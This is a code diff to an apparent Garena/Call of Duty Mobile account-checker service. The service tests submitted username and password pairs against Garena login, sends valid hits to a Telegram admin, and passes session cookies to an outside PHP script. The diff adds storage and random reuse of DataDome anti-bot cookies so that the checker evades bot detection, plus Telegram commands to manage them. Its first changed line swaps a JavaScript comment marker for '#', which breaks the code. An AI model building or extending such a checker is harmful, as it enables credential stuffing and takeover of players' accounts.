@@ -1,4 +1,4 @@
-// --- Core Node.js Modules ---
+# --- Core Node.js Modules ---
 const fs = require('fs').promises;
 const path = require('path');
 const crypto = require('crypto');
@@ -8,7 +8,7 @@ const { URL, URLSearchParams } = require('url'); // Import URLSearchParams
 require('dotenv').config(); // Load .env variables
 const express = require('express');
 const axios = require('axios');
-const { CookieJar } = require('tough-cookie');
+const { Cookie, CookieJar } = require('tough-cookie'); // Import Cookie for manual creation
 const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
 const winston = require('winston');
 const TelegramBot = require('node-telegram-bot-api');
@@ -17,6 +17,9 @@ const he = require('he'); // HTML entities
 // --- Configuration ---
 const LOG_DIR = "logs";
 const API_KEY_FILE = "api_keys.txt"; // API Keys managed via file and bot
+const DATADOME_DB_DIR = "db"; // Directory for database files
+const DATADOME_FILE = path.join(DATADOME_DB_DIR, "datadome.json"); // Path to datadome cookie file
+const MAX_DATADOME_COOKIES = 15; // Max number of datadome cookies to store
 
 // --- Telegram Bot Config ---
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -26,6 +29,8 @@ const TELEGRAM_ADMIN_USER_ID = parseInt(process.env.TELEGRAM_ADMIN_USER_ID || '0
 const APK_URL = "https://auth.garena.com/api/login?";
 const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";
 const EXTERNAL_SCRIPT_URL = process.env.EXTERNAL_SCRIPT_URL || "https://suneoxjarell.x10.bz/jajak.php"; // External dependency
+const GARENA_AUTH_DOMAIN = "auth.garena.com"; // Domain for setting cookies
+const GARENA_AUTH_URL = `https://${GARENA_AUTH_DOMAIN}/`;
 
 // --- Script Owner Information ---
 // Script Owner: YISHUX (S1N) - Please respect the original author.
@@ -45,13 +50,16 @@ const USER_AGENTS = [
 // --- Global Variables & Setup ---
 let apiKeys = new Set();
 let bot = null; // Telegram Bot instance
+let datadomeCookies = []; // In-memory store for datadome cookies
+let isSavingDatadome = false; // Mutex flag for saving datadome file
 
 // --- Logging Setup ---
 (async () => {
     try {
         await fs.mkdir(LOG_DIR, { recursive: true });
+        await fs.mkdir(DATADOME_DB_DIR, { recursive: true }); // Create DB directory if it doesn't exist
     } catch (err) {
-        console.error("Error creating log directory:", err);
+        console.error("Error creating log or db directory:", err);
     }
 })();
 
@@ -183,6 +191,89 @@ function detectCaptchaInResponse(responseText) {
     return typeof responseText === 'string' && responseText.toLowerCase().includes("captcha");
 }
 
+// --- Datadome Cookie Management ---
+
+async function loadDatadomeCookies() {
+    log.debug("Attempting to load Datadome cookies...", "loadDatadomeCookies");
+    try {
+        // Check if file exists
+        if (!await fs.access(DATADOME_FILE).then(() => true).catch(() => false)) {
+            log.warn(`${DATADOME_FILE} not found. Starting with empty list.`, "loadDatadomeCookies");
+            datadomeCookies = [];
+            return;
+        }
+        const data = await fs.readFile(DATADOME_FILE, 'utf-8');
+        const parsedData = JSON.parse(data);
+        if (Array.isArray(parsedData) && parsedData.every(item => typeof item === 'string')) {
+            datadomeCookies = parsedData.slice(-MAX_DATADOME_COOKIES); // Keep only the most recent ones up to the limit
+            log.info(`Loaded ${datadomeCookies.length} Datadome cookies from ${DATADOME_FILE}.`, "loadDatadomeCookies");
+        } else {
+            log.warn(`Invalid format in ${DATADOME_FILE}. Expected array of strings. Resetting.`, "loadDatadomeCookies");
+            datadomeCookies = [];
+            await persistDatadomeCookies(); // Overwrite corrupted file
+        }
+    } catch (err) {
+        if (err instanceof SyntaxError) {
+             log.error(`Failed to parse JSON from ${DATADOME_FILE}: ${err}. Resetting.`, "loadDatadomeCookies");
+             datadomeCookies = [];
+             await persistDatadomeCookies(); // Overwrite corrupted file
+        } else {
+            log.error(`Failed to load Datadome cookies from ${DATADOME_FILE}: ${err}`, "loadDatadomeCookies");
+            datadomeCookies = []; // Ensure it's an empty array on error
+        }
+    }
+}
+
+async function persistDatadomeCookies() {
+    if (isSavingDatadome) {
+        log.warn("Datadome save already in progress, skipping.", "persistDatadomeCookies");
+        return false;
+    }
+    isSavingDatadome = true;
+    log.debug(`Attempting to save ${datadomeCookies.length} Datadome cookies...`, "persistDatadomeCookies");
+    try {
+        // Ensure parent directory exists (should be done at startup, but double-check)
+        await fs.mkdir(path.dirname(DATADOME_FILE), { recursive: true });
+        const data = JSON.stringify(datadomeCookies, null, 2); // Pretty print JSON
+        await fs.writeFile(DATADOME_FILE, data, 'utf-8');
+        log.info(`Saved ${datadomeCookies.length} Datadome cookies to ${DATADOME_FILE}.`, "persistDatadomeCookies");
+        return true;
+    } catch (err) {
+        log.error(`Failed to save Datadome cookies to ${DATADOME_FILE}: ${err}`, "persistDatadomeCookies");
+        return false;
+    } finally {
+        isSavingDatadome = false;
+    }
+}
+
+async function saveDatadomeCookie(cookieValue) {
+    if (!cookieValue || typeof cookieValue !== 'string') {
+        log.warn("Attempted to save invalid Datadome cookie.", "saveDatadomeCookie");
+        return;
+    }
+    // Avoid duplicates and manage size
+    if (!datadomeCookies.includes(cookieValue)) {
+        datadomeCookies.push(cookieValue);
+        // Remove oldest if exceeding limit
+        if (datadomeCookies.length > MAX_DATADOME_COOKIES) {
+            datadomeCookies.shift(); // Remove the first (oldest) element
+        }
+        await persistDatadomeCookies(); // Save the updated list
+    } else {
+        log.debug("Datadome cookie already exists in store, not saving again.", "saveDatadomeCookie");
+    }
+}
+
+function getRandomDatadomeCookie() {
+    if (datadomeCookies.length === 0) {
+        return null;
+    }
+    const randomIndex = Math.floor(Math.random() * datadomeCookies.length);
+    const cookieValue = datadomeCookies[randomIndex];
+    log.debug(`Selected random Datadome cookie (index ${randomIndex}) from store.`, "getRandomDatadomeCookie");
+    return cookieValue;
+}
+
 // --- API Key Management ---
 // Using a simple mutex-like flag for file operations to avoid race conditions
 let isSavingKeys = false;
@@ -196,6 +287,8 @@ async function loadApiKeys() {
     isloadingKeys = true;
     log.debug("Attempting to load API keys...", "loadApiKeys");
     try {
+        // Ensure parent directory exists
+        await fs.mkdir(path.dirname(API_KEY_FILE), { recursive: true });
         if (!await fs.access(API_KEY_FILE).then(() => true).catch(() => false)) {
             log.warn(`${API_KEY_FILE} not found. Creating empty file.`, "loadApiKeys");
             await fs.writeFile(API_KEY_FILE, '', 'utf-8');
@@ -221,6 +314,8 @@ async function saveApiKeys() {
     isSavingKeys = true;
     log.debug(`Attempting to save ${apiKeys.size} keys...`, "saveApiKeys");
     try {
+         // Ensure parent directory exists
+        await fs.mkdir(path.dirname(API_KEY_FILE), { recursive: true });
         const header = `# API Keys for CODM Checker - Managed by Telegram Bot\n# Owner: ${OWNER_TAG}\n`;
         const data = header + Array.from(apiKeys).sort().join('\n') + '\n';
         await fs.writeFile(API_KEY_FILE, data, 'utf-8');
@@ -296,7 +391,7 @@ async function getDatadomeCookie(axiosInstance, proxies = null) {
     };
 
     try {
-        log.debug("Requesting Datadome cookie...", "getDatadomeCookie");
+        log.debug("Requesting NEW Datadome cookie...", "getDatadomeCookie"); // Added NEW
         const response = await axiosInstance.post(url, data, config);
         const responseTextClean = stripAnsiCodes(JSON.stringify(response.data)); // Check JSON data
 
@@ -309,7 +404,7 @@ async function getDatadomeCookie(axiosInstance, proxies = null) {
             const cookieString = response.data.cookie;
             const match = cookieString.match(/datadome=([^;]+)/);
             if (match && match[1]) {
-                log.debug("Successfully fetched Datadome cookie.", "getDatadomeCookie");
+                log.debug("Successfully fetched NEW Datadome cookie.", "getDatadomeCookie");
                 return match[1]; // Return the cookie value
             }
         }
@@ -541,31 +636,45 @@ async function checkLogin(accountUsername, _id, encryptedPassword, password, bas
     log.debug(`Starting check_login for ${accountUsername}`, 'checkLogin');
 
     // Datadome cookie should be handled by the axiosInstance's cookie jar if set previously
-    // However, the original script fetched it manually if not present. Let's try that if needed.
-    // We might need to extract the cookie from the jar to check if it exists.
+    // (either from prelogin or manually added from saved cookies).
+    // This function now only fetches a *new* one if the initial attempts (including the jar) failed.
     const jar = axiosInstance.defaults.jar;
     let datadomeValue = null;
     if (jar) {
-        const cookies = await jar.getCookies('https://auth.garena.com/'); // Check cookies for the domain
-        const ddCookie = cookies.find(c => c.key === 'datadome');
-        if (ddCookie) {
-            datadomeValue = ddCookie.value;
-            log.debug("Datadome cookie found in jar.", 'checkLogin');
+        try {
+            const cookies = await jar.getCookies(GARENA_AUTH_URL); // Check cookies for the domain
+            const ddCookie = cookies.find(c => c.key === 'datadome');
+            if (ddCookie) {
+                datadomeValue = ddCookie.value;
+                log.debug("Datadome cookie found in jar.", 'checkLogin');
+            }
+        } catch (e) {
+            log.warn(`Error accessing cookie jar in checkLogin: ${e}`, 'checkLogin');
         }
     }
 
+    // If still no datadome cookie (meaning the preloaded one didn't work or wasn't there)
+    // attempt ONE manual fetch as a fallback.
     if (!datadomeValue) {
-        log.debug("No Datadome in jar or jar not present, attempting manual fetch.", 'checkLogin');
+        log.debug("No Datadome in jar or jar access failed, attempting manual fetch.", 'checkLogin');
         const manualDatadomeResult = await getDatadomeCookie(axiosInstance, proxies); // Use same instance
         if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.startsWith("[")) { // Error string
             log.warn(`Manual Datadome fetch failed for ${accountUsername}: ${manualDatadomeResult}`, 'checkLogin');
-            // Decide if we should proceed or fail here. Let's try proceeding without it.
-            // return manualDatadomeResult; // Option: Fail immediately
+            // Proceed without it, login might fail but let it try.
         } else if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.length > 0) {
             log.debug("Successfully fetched Datadome manually. Adding to jar.", 'checkLogin');
-            // Manually add the cookie to the jar for subsequent requests
-            await jar.setCookie(`datadome=${manualDatadomeResult}; Domain=.garena.com; Path=/`, 'https://auth.garena.com/');
-             datadomeValue = manualDatadomeResult; // Mark as found
+            try {
+                // Manually add the cookie to the jar for subsequent requests
+                const cookie = Cookie.parse(`datadome=${manualDatadomeResult}; Domain=.${GARENA_AUTH_DOMAIN}; Path=/`);
+                if (cookie) {
+                    await jar.setCookie(cookie, GARENA_AUTH_URL);
+                    datadomeValue = manualDatadomeResult; // Mark as found/set
+                } else {
+                    log.warn("Failed to parse manually fetched Datadome cookie string.", "checkLogin");
+                }
+            } catch (e) {
+                 log.warn(`Error setting manually fetched cookie in jar: ${e}`, 'checkLogin');
+            }
         } else {
             log.warn(`Manual Datadome fetch returned None/empty for ${accountUsername}. Proceeding without.`, 'checkLogin');
         }
@@ -684,10 +793,16 @@ async function checkLogin(accountUsername, _id, encryptedPassword, password, bas
 
     // Prepare params for the external script (passing cookies and headers)
     const scriptParams = {};
-    const currentCookies = await jar.getCookies('https://account.garena.com/');
-    currentCookies.forEach(cookie => {
-        scriptParams[`coke_${cookie.key}`] = cookie.value;
-    });
+    if (jar) {
+        try {
+            const currentCookies = await jar.getCookies('https://account.garena.com/');
+            currentCookies.forEach(cookie => {
+                scriptParams[`coke_${cookie.key}`] = cookie.value;
+            });
+        } catch(e) {
+            log.warn(`Error getting cookies for account info script: ${e}`, 'checkLogin');
+        }
+    }
     // Convert header keys to snake_case for the script
     for (const [key, value] of Object.entries(accInfoHeaders)) {
         const safeKey = key.replace(/-/g, '_').toLowerCase();
@@ -1057,6 +1172,30 @@ async function performCheck(username, password) {
     const axiosInstance = axios.create({ jar });
     axiosCookieJarSupport(axiosInstance); // Apply cookie jar support
 
+    // --- Datadome Strategy ---
+    // 1. Try loading a random cookie from the saved store
+    const randomCookieValue = getRandomDatadomeCookie();
+    let usedSavedCookie = false;
+    if (randomCookieValue) {
+        try {
+            // Create a tough-cookie Cookie object
+            const cookie = Cookie.parse(`datadome=${randomCookieValue}; Domain=.${GARENA_AUTH_DOMAIN}; Path=/`);
+             if (cookie) {
+                await jar.setCookie(cookie, GARENA_AUTH_URL);
+                log.info(`Using saved Datadome cookie for ${username}`, 'performCheck');
+                usedSavedCookie = true;
+             } else {
+                 log.warn("Failed to parse random Datadome cookie string.", "performCheck");
+             }
+        } catch (e) {
+            log.error(`Error setting random Datadome cookie in jar: ${e}`, 'performCheck');
+        }
+    } else {
+        log.info("No saved Datadome cookies found or available.", 'performCheck');
+        // Will proceed to prelogin, which might set one, or checkLogin will fetch one if needed.
+    }
+    // --- End Datadome Strategy ---
+
 
     const preloginParams = new URLSearchParams({
         app_id: '100082',
@@ -1076,9 +1215,11 @@ async function performCheck(username, password) {
 
         if (detectCaptchaInResponse(preloginTextClean)) {
              log.warn(`CAPTCHA detected in prelogin response for ${username}.`, 'performCheck');
+             // If we used a saved cookie and got captcha, maybe the cookie was bad.
+             // The checkLogin function will handle fetching a new one if needed.
              return "[API_ERROR] CAPTCHA Detected (Prelogin Response)";
         }
-         // Cookies from prelogin (like datadome) are now stored in axiosInstance.defaults.jar
+         // Cookies from prelogin (like datadome, if set) are now stored in axiosInstance.defaults.jar
 
     } catch (error) {
         const errorStr = stripAnsiCodes(error.toString());
@@ -1163,6 +1304,25 @@ async function performCheck(username, password) {
         null // No proxy by default
     );
 
+    // --- Save Datadome on Success ---
+    if (typeof loginResult === 'object' && loginResult !== null && !loginResult.error) {
+        try {
+            // Extract the datadome cookie value that was *actually* used (now in the jar)
+            const cookiesAfterSuccess = await jar.getCookies(GARENA_AUTH_URL);
+            const finalDatadomeCookie = cookiesAfterSuccess.find(c => c.key === 'datadome');
+
+            if (finalDatadomeCookie && finalDatadomeCookie.value) {
+                log.info(`Check successful, saving Datadome cookie used for ${username}`, 'performCheck');
+                await saveDatadomeCookie(finalDatadomeCookie.value); // Save the successful cookie
+            } else {
+                log.warn(`Successful check for ${username}, but no Datadome cookie found in jar to save.`, 'performCheck');
+            }
+        } catch (e) {
+            log.error(`Error extracting/saving Datadome cookie after successful check for ${username}: ${e}`, 'performCheck');
+        }
+    }
+    // --- End Save Datadome ---
+
     return loginResult; // Return the dict or error string from check_login
 
 }
@@ -1177,21 +1337,23 @@ app.set('trust proxy', 1); // Adjust the number based on your proxy setup
 app.get('/api', async (req, res) => {
     // Reload keys on each request for simplicity and to reflect bot changes
     await loadApiKeys();
+    // Note: Datadome cookies are loaded at startup and managed in memory/saved on success.
+    // No need to reload them per-request unless memory usage becomes an issue.
 
     const { apikey, username, password } = req.query;
     const clientIp = req.ip;
 
-    log.info(`Request received from ${clientIp}: user=${username || 'N/A'}, key_provided=${apikey ? 'Yes' : 'No'}`, '/codm');
+    log.info(`Request received from ${clientIp}: user=${username || 'N/A'}, key_provided=${apikey ? 'Yes' : 'No'}`, '/api'); // Changed endpoint log label
 
     // Validate API Key
     if (!apikey || !apiKeys.has(apikey)) {
-        log.warn(`Invalid API key attempt from ${clientIp}. Key: ${apikey || 'None'}`, '/codm');
+        log.warn(`Invalid API key attempt from ${clientIp}. Key: ${apikey || 'None'}`, '/api');
         return res.status(401).json({ status: "error", owner: OWNER_TAG, message: "Invalid or missing API key" });
     }
 
     // Validate Input Parameters
     if (!username || !password) {
-        log.warn(`Missing username or password from ${clientIp} (Key: ${apikey})`, '/codm');
+        log.warn(`Missing username or password from ${clientIp} (Key: ${apikey})`, '/api');
         return res.status(400).json({ status: "error", owner: OWNER_TAG, message: "Missing username or password parameter" });
     }
 
@@ -1201,7 +1363,7 @@ app.get('/api', async (req, res) => {
 
         if (typeof result === 'object' && result !== null && !result.error) {
             // --- Successful check ---
-            log.info(`Check successful for ${username} (Key: ${apikey}). Level: ${result?.codm_details?.level ?? 'N/A'}`, '/codm');
+            log.info(`Check successful for ${username} (Key: ${apikey}). Level: ${result?.codm_details?.level ?? 'N/A'}`, '/api');
 
             // --- FORWARD SUCCESS TO TELEGRAM ADMIN (Non-blocking) ---
             if (bot && TELEGRAM_ADMIN_USER_ID) {
@@ -1225,11 +1387,11 @@ app.get('/api', async (req, res) => {
 
                 bot.sendMessage(TELEGRAM_ADMIN_USER_ID, successMsg, { parse_mode: 'MarkdownV2' })
                     .catch(err => {
-                        log.warn(`Failed to forward success message to admin ${TELEGRAM_ADMIN_USER_ID}: ${err.message || err}`, '/codm');
+                        log.warn(`Failed to forward success message to admin ${TELEGRAM_ADMIN_USER_ID}: ${err.message || err}`, '/api');
                     });
             } else {
-                if (!bot) log.warn("Telegram bot instance not available for forwarding success.", '/codm');
-                if (!TELEGRAM_ADMIN_USER_ID) log.warn("Telegram Admin User ID not configured for forwarding success.", '/codm');
+                if (!bot) log.warn("Telegram bot instance not available for forwarding success.", '/api');
+                if (!TELEGRAM_ADMIN_USER_ID) log.warn("Telegram Admin User ID not configured for forwarding success.", '/api');
             }
             // --- END TELEGRAM FORWARD ---
 
@@ -1237,7 +1399,7 @@ app.get('/api', async (req, res) => {
 
         } else if (typeof result === 'string') {
             // Handle known error strings
-            log.warn(`Check failed for ${username} (Key: ${apikey}): ${result}`, '/codm');
+            log.warn(`Check failed for ${username} (Key: ${apikey}): ${result}`, '/api');
             let status_code = 500; // Default internal error
             let message = "Check failed";
             let detail = result;
@@ -1266,12 +1428,12 @@ app.get('/api', async (req, res) => {
             return res.status(status_code).json({ status: "error", owner: OWNER_TAG, message: message, detail: detail });
         } else {
             // Unexpected result type
-            log.error(`Unexpected result type from perform_check for ${username}: ${typeof result}`, '/codm');
+            log.error(`Unexpected result type from perform_check for ${username}: ${typeof result}`, '/api');
             return res.status(500).json({ status: "error", owner: OWNER_TAG, message: "Internal server error (unexpected result type)" });
         }
 
     } catch (error) {
-        log.error(`Critical error processing request for ${username} (Key: ${apikey}): ${error.stack || error}`, '/codm');
+        log.error(`Critical error processing request for ${username} (Key: ${apikey}): ${error.stack || error}`, '/api');
         return res.status(500).json({ status: "error", owner: OWNER_TAG, message: "Internal server error", detail: stripAnsiCodes(String(error)) });
     }
 });
@@ -1280,7 +1442,8 @@ app.get('/', (req, res) => {
      res.status(200).json({
          status: "ok",
          message: "S1N CODM Checker API is running.",
-         owner: OWNER_TAG
+         owner: OWNER_TAG,
+         datadome_cookies_loaded: datadomeCookies.length // Add info about loaded cookies
         });
 });
 
@@ -1315,7 +1478,10 @@ function setupTelegramBot() {
                 `Use /addkey \`<key>\` to add an API key\\.\n` +
                 `Use /removekey \`<key>\` to remove an API key\\.\n` +
                 `Use /listkeys to view current keys\\.\n`+
-                `Use /reloadkeys to force reload from file\\.`,
+                `Use /reloadkeys to force reload from file\\.\n\n`+
+                `*Datadome Management:*\n`+
+                ` /listdatadome \\- View saved Datadome cookies \\(first/last 5\\)\n` +
+                ` /cleardatadome \\- Clear all saved Datadome cookies`,
                  { parse_mode: "MarkdownV2" }
             );
         });
@@ -1393,10 +1559,57 @@ function setupTelegramBot() {
              bot.sendMessage(msg.chat.id, `✅ Reloaded ${apiKeys.size} keys from file\\.`, { parse_mode: 'MarkdownV2' });
          });
 
+         // --- Datadome Bot Commands ---
+         bot.onText(/\/listdatadome$/, async (msg) => {
+            if (!authorized(msg)) return;
+            // No need to reload datadome, using in-memory copy
+            if (datadomeCookies.length === 0) {
+                bot.sendMessage(msg.chat.id, "ℹ️ No Datadome cookies currently stored.");
+            } else {
+                let listMsg = `🍪 Stored Datadome Cookies (${datadomeCookies.length} total, max ${MAX_DATADOME_COOKIES}):\n`;
+                 // Show first 5 and last 5 for brevity if list is long
+                const maxToShow = 5;
+                const cookiesToShow = [];
+                if (datadomeCookies.length <= maxToShow * 2) {
+                     cookiesToShow.push(...datadomeCookies);
+                } else {
+                    cookiesToShow.push(...datadomeCookies.slice(0, maxToShow)); // First 5
+                    cookiesToShow.push("..."); // Ellipsis
+                    cookiesToShow.push(...datadomeCookies.slice(-maxToShow)); // Last 5
+                }
+
+                listMsg += cookiesToShow.map((cookie, index) => {
+                    const displayIndex = (cookie === "...") ? "..." : (index < maxToShow ? index : datadomeCookies.length - (cookiesToShow.length - index));
+                    const truncatedCookie = (cookie === "...") ? "..." : `${cookie.substring(0, 15)}...${cookie.substring(cookie.length - 15)}`;
+                    // Escape for MarkdownV2 - simple backticks
+                    const escapedCookie = `\`${truncatedCookie.replace(/`/g, "'")}\``;
+                    return `${displayIndex}: ${escapedCookie}`;
+                }).join('\n');
+
+                bot.sendMessage(msg.chat.id, listMsg, { parse_mode: 'MarkdownV2' });
+            }
+         });
+
+         bot.onText(/\/cleardatadome$/, async (msg) => {
+             if (!authorized(msg)) return;
+             const countBefore = datadomeCookies.length;
+             datadomeCookies = []; // Clear in-memory
+             const saved = await persistDatadomeCookies(); // Save empty array to file
+             if (saved) {
+                 bot.sendMessage(msg.chat.id, `✅ Cleared ${countBefore} Datadome cookies successfully\\.`, { parse_mode: 'MarkdownV2' });
+                 log.info(`Datadome cookies cleared by admin ${msg.from.id} via Telegram.`, 'TelegramBot');
+             } else {
+                 // Attempt to reload previous state? Or just report failure.
+                 await loadDatadomeCookies(); // Try reloading what was last saved (might be empty already)
+                 bot.sendMessage(msg.chat.id, "❌ Failed to save cleared Datadome cookies to file. Check logs. In-memory list might be cleared, attempting reload.", { parse_mode: 'MarkdownV2' });
+             }
+         });
+
         // Optional: Catch-all for unknown commands for the admin
         bot.on('message', (msg) => {
             // Ignore if it's a known command or not from admin
-            if (msg.text && msg.text.startsWith('/') && !['/start', '/addkey', '/removekey', '/listkeys', '/reloadkeys'].some(cmd => msg.text.startsWith(cmd))) {
+             const knownCommands = ['/start', '/addkey', '/removekey', '/listkeys', '/reloadkeys', '/listdatadome', '/cleardatadome'];
+            if (msg.text && msg.text.startsWith('/') && !knownCommands.some(cmd => msg.text.startsWith(cmd))) {
                 if (authorized(msg, false)) { // Authorize but don't send the default "not authorized" reply
                      bot.sendMessage(msg.chat.id, "❓ Sorry, I didn't understand that command\\. Use /start to see available commands\\.", { parse_mode: 'MarkdownV2' });
                 }
@@ -1426,7 +1639,9 @@ function setupTelegramBot() {
 (async () => {
     log.info(`--- API Checker Script Started (PID: ${process.pid}) ---`);
     log.info(`--- Owner: ${OWNER_TAG} ---`);
-    await loadApiKeys(); // Initial load of keys
+    // Initial load of persistent data
+    await loadApiKeys();
+    await loadDatadomeCookies(); // Load saved datadome cookies
 
     // Start Telegram bot
     setupTelegramBot(); // Starts polling internally if configured
@@ -1437,6 +1652,9 @@ function setupTelegramBot() {
 
     app.listen(port, host, () => {
         log.info(`Express application listening on http://${host}:${port}`);
+        log.info(`Datadome cookies loaded: ${datadomeCookies.length}`);
+        log.info(`API Keys loaded: ${apiKeys.size}`);
+        log.info(`NOTE: Datadome file (${DATADOME_FILE}) is saved locally. Syncing to GitHub requires external setup.`);
     });
 
 })();
@@ -1444,7 +1662,9 @@ function setupTelegramBot() {
 // Graceful shutdown handler
 async function gracefulShutdown(signal) {
     log.info(`${signal} received. Shutting down gracefully...`);
-    // Add any cleanup tasks here (e.g., closing DB connections)
+    // Ensure pending datadome cookies are saved
+    await persistDatadomeCookies();
+    // Add any other cleanup tasks here (e.g., closing DB connections)
     if (bot) {
         log.info("Stopping Telegram bot polling...");
         // Add a timeout to stopPolling in case it hangs
